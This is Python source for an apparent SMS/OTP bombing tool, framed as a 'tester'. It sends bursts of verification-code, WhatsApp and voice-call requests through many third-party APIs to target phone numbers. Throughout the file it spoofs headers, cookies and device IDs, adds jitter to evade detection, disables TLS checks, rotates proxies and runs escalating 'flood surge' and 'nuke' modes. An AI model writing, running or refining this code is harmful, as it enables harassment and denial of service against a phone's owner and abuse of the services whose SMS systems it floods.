from __future__ import annotations

import asyncio
import gc
import re
import string
import time
import uuid
import random
from typing import Dict, List, Optional, Callable, Set

import aiohttp
from aiohttp import TCPConnector
from aiohttp_socks import ProxyConnector

from helpers import injectRotatedHeaders

# Global semaphore — created lazily inside event loop
_GLOBAL_SEM: Optional[asyncio.Semaphore] = None

def getGlobalSem() -> asyncio.Semaphore:
    global _GLOBAL_SEM
    if _GLOBAL_SEM is None:
        _GLOBAL_SEM = asyncio.Semaphore(150)
    return _GLOBAL_SEM

# ---------------------------------------------------------------------------
# OTP detection keywords
# ---------------------------------------------------------------------------
OTP_KEYWORDS = (
    "otp sent", "otp has been sent", "verification code sent",
    "sent successfully", "sms sent", "message sent",
    '"success":true', '"status":"success"', '"status":"ok"',
    '"result":true', "successfully sent", "send otp", "otp generated",
    "message delivered", "sms delivered", "code sent", "verification sent",
    "whatsapp", "wp otp", "sent to whatsapp",
    "call initiated", "call placed", "calling", "voice call", "ivr",
)

# Honeypot patterns — APIs that fake success but do nothing
_HONEYPOT_RE = re.compile(
    r'^\s*(\{\s*"status"\s*:\s*"ok"\s*\}|\{\s*"message"\s*:\s*"success"\s*\}'
    r'|\{\s*"code"\s*:\s*0\s*\}|\{\s*\}|true|1|ok)\s*$',
    re.IGNORECASE
)
_honeypotApis:   Set[str]       = set()
_honeypotCounts: Dict[str, int] = {}
HONEYPOT_THRESHOLD = 5


def isOtp(status: int, text: str) -> bool:
    if status not in (200, 201, 202):
        return False
    tl = text.lower()
    return any(k in tl for k in OTP_KEYWORDS)


def checkHoneypot(name: str, text: str) -> bool:
    if name in _honeypotApis:
        return True
    if _HONEYPOT_RE.match(text.strip()):
        _honeypotCounts[name] = _honeypotCounts.get(name, 0) + 1
        if _honeypotCounts[name] >= HONEYPOT_THRESHOLD:
            _honeypotApis.add(name)
        return True
    _honeypotCounts[name] = 0
    return False


# ---------------------------------------------------------------------------
# Phone variants — all 4 formats
# ---------------------------------------------------------------------------
def phoneVariants(phone: str) -> tuple:
    return (phone, f"91{phone}", f"+91{phone}", f"0{phone}")


# ---------------------------------------------------------------------------
# Lightweight placeholder replacement — NO deepcopy
# ---------------------------------------------------------------------------
def _replaceStr(s: str, phone: str) -> str:
    if "{phone}" in s:
        s = s.replace("{phone}", phone)
    if "{uuid}" in s:
        s = s.replace("{uuid}", str(uuid.uuid4()))
    if "{device_id}" in s:
        s = s.replace("{device_id}", uuid.uuid4().hex)
    if "{session_id}" in s:
        s = s.replace("{session_id}", "".join(
            random.choices(string.ascii_lowercase + string.digits, k=32)
        ))
    if "{timestamp}" in s:
        s = s.replace("{timestamp}", str(int(time.time() * 1000)))
    return s


def _replaceObj(obj, phone: str):
    """Replace placeholders in dict/list/str without deepcopy."""
    if obj is None:
        return None
    if isinstance(obj, str):
        return _replaceStr(obj, phone)
    if isinstance(obj, dict):
        return {k: _replaceObj(v, phone) for k, v in obj.items()}
    if isinstance(obj, list):
        return [_replaceObj(v, phone) for v in obj]
    return obj


def _coerce(obj, original):
    """Coerce string values to match original types."""
    if isinstance(original, dict) and isinstance(obj, dict):
        return {k: _coerce(obj.get(k, v), v) for k, v in original.items()}
    if isinstance(original, list) and isinstance(obj, list):
        return [_coerce(o, p) for o, p in zip(obj, original)]
    if isinstance(original, int) and isinstance(obj, str):
        try: return int(obj)
        except (ValueError, TypeError): return obj
    if isinstance(original, float) and isinstance(obj, str):
        try: return float(obj)
        except (ValueError, TypeError): return obj
    return obj


# ---------------------------------------------------------------------------
# Random cookie injection — lightweight
# ---------------------------------------------------------------------------
def _freshCookies(existing: Optional[dict]) -> dict:
    c = {
        "session_id": uuid.uuid4().hex,
        "device_id":  str(uuid.uuid4()),
        "_ga": f"GA1.2.{random.randint(100000000,999999999)}.{int(time.time())}",
        "csrf_token": uuid.uuid4().hex,
    }
    if existing:
        c.update(existing)
    return c


# ---------------------------------------------------------------------------
# Shared connector — ONE per process, created lazily inside event loop
# ---------------------------------------------------------------------------
_sharedConnector: Optional[TCPConnector] = None


def getSharedConnector() -> TCPConnector:
    global _sharedConnector
    try:
        if _sharedConnector is None or _sharedConnector.closed:
            _sharedConnector = TCPConnector(
                limit=0,
                limit_per_host=30,
                ttl_dns_cache=600,
                ssl=False,
                keepalive_timeout=30,
                force_close=False,
                enable_cleanup_closed=True,
            )
    except Exception:
        _sharedConnector = TCPConnector(limit=0, ssl=False)
    return _sharedConnector


# ---------------------------------------------------------------------------
# Per-API state
# ---------------------------------------------------------------------------
class ApiState:
    __slots__ = (
        "name", "status", "requests", "confirmed", "responses2xx",
        "rateLimits", "errors", "totalLatencyMs", "latencyCount",
        "concurrency", "_sw", "_ew",
    )
    ACTIVE   = "active"
    HONEYPOT = "honeypot"

    MIN_C = 1
    MAX_C = 32

    def __init__(self, name: str, base: int):
        self.name          = name
        self.status        = self.ACTIVE
        self.requests      = 0
        self.confirmed     = 0
        self.responses2xx  = 0
        self.rateLimits    = 0
        self.errors        = 0
        self.totalLatencyMs = 0.0
        self.latencyCount  = 0
        self.concurrency   = min(base, self.MAX_C)
        self._sw           = 0   # success window
        self._ew           = 0   # error window

    def avgMs(self) -> int:
        return int(self.totalLatencyMs / self.latencyCount) if self.latencyCount else 0

    def adapt(self, success: bool) -> None:
        if success: self._sw += 1
        else:       self._ew += 1
        total = self._sw + self._ew
        if total < 20:
            return
        rate = self._sw / total
        if rate >= 0.7:
            self.concurrency = min(self.concurrency + 2, self.MAX_C)
        elif rate <= 0.3:
            self.concurrency = max(self.concurrency - 1, self.MIN_C)
        self._sw = 0
        self._ew = 0


# ---------------------------------------------------------------------------
# Stats — no asyncio lock, GIL is enough for CPython int ops
# ---------------------------------------------------------------------------
class Stats:
    __slots__ = (
        "startTime", "totalReqs", "confirmed", "responses",
        "errors", "surgeCount", "apiStates", "onOtpConfirmed",
    )

    def __init__(self, apiNames: List[str], base: int):
        self.startTime      = time.time()
        self.totalReqs      = 0
        self.confirmed      = 0
        self.responses      = 0
        self.errors         = 0
        self.surgeCount     = 0
        self.apiStates: Dict[str, ApiState] = {n: ApiState(n, base) for n in apiNames}
        self.onOtpConfirmed: Optional[Callable] = None

    def elapsed(self) -> float:
        return time.time() - self.startTime

    def rps(self) -> float:
        e = self.elapsed()
        return round(self.totalReqs / e, 1) if e > 0 else 0.0

    def recordSuccess(self, name: str, latency: float, confirmed: bool) -> None:
        self.totalReqs += 1
        self.responses += 1
        s = self.apiStates.get(name)
        if s:
            s.requests       += 1
            s.responses2xx   += 1
            s.totalLatencyMs += latency * 1000
            s.latencyCount   += 1
            s.adapt(True)
            if confirmed:
                s.confirmed    += 1
                self.confirmed += 1
                if self.onOtpConfirmed:
                    asyncio.create_task(self.onOtpConfirmed(name))

    def recordRateLimit(self, name: str) -> None:
        self.totalReqs += 1
        s = self.apiStates.get(name)
        if s:
            s.requests    += 1
            s.rateLimits  += 1

    def recordError(self, name: str) -> None:
        self.totalReqs += 1
        self.errors    += 1
        s = self.apiStates.get(name)
        if s:
            s.requests += 1
            s.errors   += 1
            s.adapt(False)

    def markHoneypot(self, name: str) -> None:
        s = self.apiStates.get(name)
        if s:
            s.status = ApiState.HONEYPOT

    def snapshot(self) -> dict:
        perApi = {}
        for name, s in self.apiStates.items():
            perApi[name] = {
                "requests":   s.requests,
                "confirmed":  s.confirmed,
                "responses":  s.responses2xx,
                "errors":     s.errors,
                "ratelimits": s.rateLimits,
                "avgMs":      s.avgMs(),
                "status":     s.status,
                "concurrency":s.concurrency,
            }
        return {
            "totalReqs":  self.totalReqs,
            "confirmed":  self.confirmed,
            "responses":  self.responses,
            "errors":     self.errors,
            "surgeCount": self.surgeCount,
            "elapsed":    round(self.elapsed(), 1),
            "rps":        self.rps(),
            "perApi":     perApi,
            "total":      self.totalReqs,
            "otpSent":    self.confirmed,
        }


# ---------------------------------------------------------------------------
# Single API call — no deepcopy, global semaphore, jitter
# ---------------------------------------------------------------------------
async def callApi(
    session: aiohttp.ClientSession,
    api: dict,
    phone: str,
    stats: Stats,
    stopEvent: asyncio.Event,
    retry: bool = True,
) -> bool:
    name = api["name"]
    if stopEvent.is_set():
        return False

    s = stats.apiStates.get(name)
    if s and s.status == ApiState.HONEYPOT:
        return False

    # Jitter 0-50ms — avoids pattern detection, spaces out bursts
    await asyncio.sleep(random.uniform(0, 0.05))

    # Build request params WITHOUT deepcopy
    variants = phoneVariants(phone)
    p        = variants[int(time.time() * 1000) % 4]

    url      = api["url"].replace("{phone}", p)
    headers  = injectRotatedHeaders(_replaceObj(api.get("headers") or {}, p))
    params   = _replaceObj(api.get("params"), p)
    jsonData = _coerce(_replaceObj(api.get("json"), p), api.get("json"))
    data     = _replaceObj(api.get("data"), p)
    cookies  = _freshCookies(_replaceObj(api.get("cookies"), p))

    try:
        async with getGlobalSem():
            t0 = time.monotonic()
            async with session.request(
                api["method"], url,
                headers=headers,
                params=params,
                json=jsonData,
                data=data,
                cookies=cookies,
                timeout=aiohttp.ClientTimeout(total=6, connect=2),
                allow_redirects=True,
                ssl=False,
            ) as resp:
                latency = time.monotonic() - t0
                text    = await resp.text(errors="ignore")

                if resp.status == 429:
                    stats.recordRateLimit(name)
                    return False

                if 200 <= resp.status < 300:
                    if checkHoneypot(name, text):
                        stats.markHoneypot(name)
                        return False
                    confirmed = isOtp(resp.status, text)
                    stats.recordSuccess(name, latency, confirmed)
                    return True

                stats.recordError(name)
                if retry and not stopEvent.is_set():
                    return await callApi(session, api, phone, stats, stopEvent, retry=False)
                return False

    except asyncio.TimeoutError:
        stats.recordError(name)
        return False
    except (aiohttp.ClientConnectorError, aiohttp.ServerDisconnectedError,
            aiohttp.ClientOSError, aiohttp.ClientResponseError):
        stats.recordError(name)
        return False
    except Exception:
        stats.recordError(name)
        return False


# ---------------------------------------------------------------------------
# Per-API worker — memory efficient, controlled concurrency
# ---------------------------------------------------------------------------
async def apiWorker(
    api: dict,
    phone: str,
    stats: Stats,
    stopEvent: asyncio.Event,
    baseConcurrency: int,
    burstDuration: float = 15.0,
    burstMultiplier: int  = 3,
) -> None:
    # Use shared connector — no per-worker session overhead
    session = aiohttp.ClientSession(
        connector=getSharedConnector(),
        connector_owner=False,   # don't close shared connector
    )

    try:
        activeTasks: Set[asyncio.Task] = set()
        floodBudget = 0
        startTime   = time.monotonic()

        while not stopEvent.is_set():
            s = stats.apiStates.get(api["name"])
            if s and s.status == ApiState.HONEYPOT:
                break

            # Clean finished tasks — critical for memory
            done        = {t for t in activeTasks if t.done()}
            activeTasks -= done

            # Count flood bonus from successes
            for t in done:
                try:
                    if t.result():
                        floodBudget = min(floodBudget + 2, 10)  # cap flood budget
                except Exception:
                    pass

            # Determine target concurrency
            elapsed = time.monotonic() - startTime
            base    = s.concurrency if s else baseConcurrency
            if elapsed < burstDuration:
                target = min(base * burstMultiplier, ApiState.MAX_C)
            else:
                target = base

            # Fire flood budget
            if floodBudget > 0 and len(activeTasks) < target + 5:
                task = asyncio.create_task(
                    callApi(session, api, phone, stats, stopEvent)
                )
                activeTasks.add(task)
                floodBudget -= 1
                continue

            # Normal fill
            if len(activeTasks) < target:
                task = asyncio.create_task(
                    callApi(session, api, phone, stats, stopEvent)
                )
                activeTasks.add(task)
            else:
                await asyncio.sleep(0.001)  # yield — prevents CPU spin

        # Cancel remaining tasks
        for t in activeTasks:
            t.cancel()
        if activeTasks:
            await asyncio.gather(*activeTasks, return_exceptions=True)
        activeTasks.clear()

    finally:
        await session.close()


# ---------------------------------------------------------------------------
# Flood surge — periodic wave, capped size for memory safety
# ---------------------------------------------------------------------------
async def floodSurge(
    apis: List[dict],
    phone: str,
    stats: Stats,
    stopEvent: asyncio.Event,
    surgeSize: int   = 80,    # reduced from 500 — safe for free tier
    interval: float  = 15.0,  # every 15s instead of 10s
) -> None:
    session = aiohttp.ClientSession(
        connector=getSharedConnector(),
        connector_owner=False,
    )
    try:
        while not stopEvent.is_set():
            try:
                await asyncio.wait_for(asyncio.shield(stopEvent.wait()), timeout=interval)
                break
            except asyncio.TimeoutError:
                pass

            if stopEvent.is_set():
                break

            activeApis = [
                a for a in apis
                if stats.apiStates.get(a["name"]) and
                stats.apiStates[a["name"]].status != ApiState.HONEYPOT
            ]
            if not activeApis:
                continue

            stats.surgeCount += 1
            tasks = []
            for idx in range(surgeSize):
                api  = activeApis[idx % len(activeApis)]
                task = asyncio.create_task(
                    callApi(session, api, phone, stats, stopEvent)
                )
                tasks.append(task)

            await asyncio.gather(*tasks, return_exceptions=True)
            tasks.clear()

    finally:
        await session.close()


# ---------------------------------------------------------------------------
# Admin single API test
# ---------------------------------------------------------------------------
async def testSingleApi(api: dict, phone: str) -> dict:
    try:
        url     = api["url"].replace("{phone}", phone)
        headers = injectRotatedHeaders(_replaceObj(api.get("headers") or {}, phone))
        params  = _replaceObj(api.get("params"), phone)
        json_   = _coerce(_replaceObj(api.get("json"), phone), api.get("json"))
        data    = _replaceObj(api.get("data"), phone)
        cookies = _replaceObj(api.get("cookies"), phone)

        connector = TCPConnector(limit=5, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            t0 = time.monotonic()
            async with session.request(
                api["method"], url,
                headers=headers, params=params,
                json=json_, data=data, cookies=cookies,
                timeout=aiohttp.ClientTimeout(total=15),
                allow_redirects=True,
            ) as resp:
                latency = round((time.monotonic() - t0) * 1000)
                text    = await resp.text(errors="ignore")
                return {
                    "ok": True, "status": resp.status,
                    "latencyMs": latency, "snippet": text[:300].strip()
                }
    except asyncio.TimeoutError:
        return {"ok": False, "error": "Timeout (>15s)"}
    except Exception as e:
        return {"ok": False, "error": str(e)[:80]}


# ---------------------------------------------------------------------------
# Proxy helpers
# ---------------------------------------------------------------------------
async def checkProxy(proxy: str) -> Optional[str]:
    try:
        connector = ProxyConnector.from_url(proxy)
        async with aiohttp.ClientSession(connector=connector) as s:
            async with s.get("http://httpbin.org/ip",
                             timeout=aiohttp.ClientTimeout(total=5)):
                return proxy
    except Exception:
        return None


async def validateProxies(proxyList: List[str]) -> List[str]:
    results = await asyncio.gather(*[checkProxy(p) for p in proxyList])
    return [p for p in results if p]


# ---------------------------------------------------------------------------
# Runner — memory safe, gc after every test
# ---------------------------------------------------------------------------
class TesterRunner:
    __slots__ = (
        "phones", "phone", "duration", "workers", "useProxy",
        "_proxyList", "_userId", "_bot", "nukeMode",
        "_apiConfigs", "_skipSet", "stats", "_stopEvent",
        "_tasks", "_running", "_endTime",
    )

    def __init__(
        self,
        phone: str,
        duration: int,
        workers: int,
        useProxy: bool,
        proxyList: Optional[List[str]] = None,
        userId: Optional[int]          = None,
        bot                            = None,
        nukeMode: bool                 = False,
    ) -> None:
        raw          = [p.strip() for p in phone.replace("،", ",").split(",")
                        if p.strip().isdigit() and len(p.strip()) == 10]
        self.phones  = raw if raw else [phone]
        self.phone   = self.phones[0]
        self.duration  = duration
        self.workers   = min(workers if not nukeMode else 32, 32)  # hard cap at 32
        self.useProxy  = useProxy
        self._proxyList = proxyList or []
        self._userId   = userId
        self._bot      = bot
        self.nukeMode  = nukeMode

        from bot.services.api_manager import apiManager
        from bot.services.database import db
        self._apiConfigs: List[dict] = apiManager.getMergedConfigs()
        self._skipSet:    set        = db.getSkippedApiNames()

        self.stats      = Stats([a["name"] for a in self._apiConfigs], self.workers)
        self._stopEvent = asyncio.Event()
        self._tasks: List[asyncio.Task] = []
        self._running   = False
        self._endTime   = 0.0

    @property
    def isRunning(self) -> bool:
        return self._running

    async def start(self) -> None:
        self._running = True
        self._endTime = time.time() + self.duration
        self._stopEvent.clear()

        # Reset honeypot tracking per session
        _honeypotApis.clear()
        _honeypotCounts.clear()

        self.stats = Stats([a["name"] for a in self._apiConfigs], self.workers)

        proxyList: List[str] = []
        if self.useProxy and self._proxyList:
            proxyList = await validateProxies(self._proxyList)

        activeApis = [a for a in self._apiConfigs if a["name"] not in self._skipSet]

        # Nuke = burst forever at 3x, normal = 15s burst at 2x
        burstDuration   = 9999.0 if self.nukeMode else 15.0
        burstMultiplier = 3      if self.nukeMode else 2
        surgeSize       = 100    if self.nukeMode else 60
        surgeInterval   = 12.0   if self.nukeMode else 20.0

        for phone in self.phones:
            for api in activeApis:
                task = asyncio.create_task(
                    apiWorker(
                        api=api,
                        phone=phone,
                        stats=self.stats,
                        stopEvent=self._stopEvent,
                        baseConcurrency=self.workers,
                        burstDuration=burstDuration,
                        burstMultiplier=burstMultiplier,
                    ),
                    name=f"w_{phone[:4]}_{api['name'][:8]}"
                )
                self._tasks.append(task)

            # Flood surge per phone
            self._tasks.append(asyncio.create_task(
                floodSurge(activeApis, phone, self.stats, self._stopEvent,
                           surgeSize, surgeInterval),
                name=f"surge_{phone[:4]}"
            ))

        self._tasks.append(asyncio.create_task(self._timer(),    name="timer"))
        self._tasks.append(asyncio.create_task(self._watchdog(), name="watchdog"))

    async def stop(self) -> None:
        self._stopEvent.set()
        for t in self._tasks:
            t.cancel()
        await asyncio.gather(*self._tasks, return_exceptions=True)
        self._tasks.clear()
        self._running = False
        # Force garbage collection — reclaim memory immediately
        gc.collect()

    async def _timer(self) -> None:
        delay = self._endTime - time.time()
        if delay > 0:
            await asyncio.sleep(delay)
        self._stopEvent.set()

    async def _watchdog(self) -> None:
        workerTasks = [t for t in self._tasks
                       if t.get_name().startswith(("w_", "surge_"))]
        if workerTasks:
            await asyncio.gather(*workerTasks, return_exceptions=True)
        self._running = False
        # Force gc when test finishes naturally
        gc.collect()
